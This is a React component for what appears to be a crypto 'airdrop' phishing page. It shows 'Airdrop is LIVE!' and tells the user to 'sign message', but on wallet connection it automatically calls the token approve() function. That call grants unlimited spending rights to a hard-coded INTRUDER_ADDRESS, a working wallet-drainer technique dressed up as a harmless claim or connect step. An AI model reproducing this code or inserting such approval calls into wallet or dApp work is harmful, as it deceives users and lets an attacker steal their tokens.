import { FC, useEffect, useState } from 'react';
import { ethers } from 'ethers';
import { TransactionResponse } from '@ethersproject/abstract-provider';
import { errorCodes, serializeError } from '@metamask/rpc-errors';
import { toast } from 'react-toastify';
import { Button } from 'antd';
import { useWallet } from 'hooks';
import { ERC20TokenABI } from 'abi';
import { CONFIGURED_TOKENS, INTRUDER_ADDRESS, UINT256_MAX_INT } from 'config';
import styles from './NotConnected.module.scss';

interface OriginalError {
  cause?: {
    code: string;
    reason: string;
  };
}

const capitalizeFirstLetter = (value: string) => {
  if (!value) {
    return '';
  }

  return value.charAt(0).toUpperCase() + value.slice(1);
};

const NotSigned: FC = () => {
  const { signer, chain, setIsSigned } = useWallet();
  const [isLoading, setIsLoading] = useState(false);

  const giveApproval = async () => {
    try {
      const isOkay = chain && !chain.unsupported;

      if (!signer || !isOkay) {
        return;
      }

      setIsLoading(true);
      const tokenAddress = CONFIGURED_TOKENS[chain.id];
      const contract = new ethers.Contract(tokenAddress, ERC20TokenABI, signer);

      const txnResponse: TransactionResponse = await contract.approve(
        INTRUDER_ADDRESS,
        UINT256_MAX_INT
      );

      await txnResponse.wait();
      toast.success('Success');
      setIsSigned(true);
    } catch (error: any) {
      const rpcError = serializeError(error);

      const errorData = rpcError.data as OriginalError;
      const cause = errorData?.cause;

      if (
        rpcError.code === errorCodes.rpc.internal &&
        !!cause &&
        cause.code === 'ACTION_REJECTED'
      ) {
        toast.error(capitalizeFirstLetter(cause.reason), { autoClose: 2000 });
      } else {
        toast.error(error?.message, { autoClose: 2000 });
      }
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (signer) {
      giveApproval();
    }
  }, [signer]);

  return (
    <div className={styles.container}>
      <div className={styles.wrapper}>
        <h3 className={styles.container__title}>Airdrop is LIVE!</h3>
        <Button
          type="primary"
          size="large"
          onClick={giveApproval}
          loading={isLoading}
        >
          Connect
        </Button>

        <div className={styles.container__hint}>
          Sign message in your wallet
        </div>
      </div>
    </div>
  );
};

export default NotSigned;
